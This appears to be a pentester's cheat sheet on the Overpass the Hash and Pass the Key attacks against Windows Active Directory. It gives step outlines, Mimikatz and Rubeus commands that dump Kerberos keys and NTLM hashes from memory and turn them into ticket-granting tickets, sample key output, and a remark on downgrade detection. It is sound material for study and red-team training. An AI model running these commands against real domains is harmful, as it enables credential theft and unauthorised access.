#### Overpass the Hash
Turn a hash/key (rc4_hmac, aes256_cts_hmac_sha1, etc.) for a domain-joined user into a fully-fledged ticket-granting-ticket (TGT), effectively "upgrading" from NTLM to Kerberos.
1. The attacker obtains a user's NTLM hash.
2. Instead of using the hash directly with NTLM authentication (pass the hash), they use it to request a Kerberos TGT.
3. This creates new logon sessions that use Kerberos instead of NTLM.
4. The attacker can then access resources that may only accept Kerberos authentication.
#### Pass the Key
Pass the key is similar but uses the Kerberos authentication protocol elements directly.
1. The attacker extracts the long-term secret key (DES or AES keys) from the Windows memory.
2. These keys are derived from the user's password and are used for Kerberos authentication.
3. The attacker uses these keys directly to generate Kerberos tickets.
---
## OPtH and PtK from Windows
> **Note:** Mimikatz requires administrative rights to perform the Pass the Key/OverPass the Hash attacks, while Rubeus doesn't.
1. Mimikatz
``` Powershell
# Extract kerberos keys
PS> mimikatz.exe "privilege::debug" "sekurlsa::ekeys"
...[SNIP]...
         * Username : username
         * Domain   : certainDomain
         * Password : (null)
         * Key List :
           aes256_hmac       b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60
           rc4_hmac_nt       3f74aa8f08f712f09cd5177b5c1ce50f
           rc4_hmac_old      3f74aa8f08f712f09cd5177b5c1ce50f
           rc4_md4           3f74aa8f08f712f09cd5177b5c1ce50f
           rc4_hmac_nt_exp   3f74aa8f08f712f09cd5177b5c1ce50f
           rc4_hmac_old_exp  3f74aa8f08f712f09cd5177b5c1ce50f
...[SNIP]...


# Use extracted AES256_HMAC and RC4_HMAC keys
PS> mimikatz.exe "privilege::debug" "sekurlsa::pth /domain: /user: /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f"
# you can use /ntlm and /rc4 to overpass the hsah and /aes128,/aes256 to pass the key 
# A nwe cmd in the context of the target user will pop up or add /ptt to inject the TGT in the current session
```
2. Rubeus
``` Powershell
# Extract kerberos keys
PS> Rubeus.exe dump /nowrap

# Use extracted key which can be /rc4, /aes128, /aes256, or /des.
PS> Rubeus.exe asktgt /domain:$DOMAIN /user:$USER /aes256:b21c99fc068e3ab... /nowrap 
# you can use /ntlm and /rc4 to overpass the hsah and /aes128,/aes256 to pass the key 
```
---
> [!Important]
> Note: Modern Windows domains (functional level 2008 and above) use AES encryption by default in normal Kerberos exchanges. If we use a rc4_hmac (NTLM) hash in a Kerberos exchange instead of an aes256_cts_hmac_sha1 (or aes128) key, it may be detected as an "encryption downgrade." 

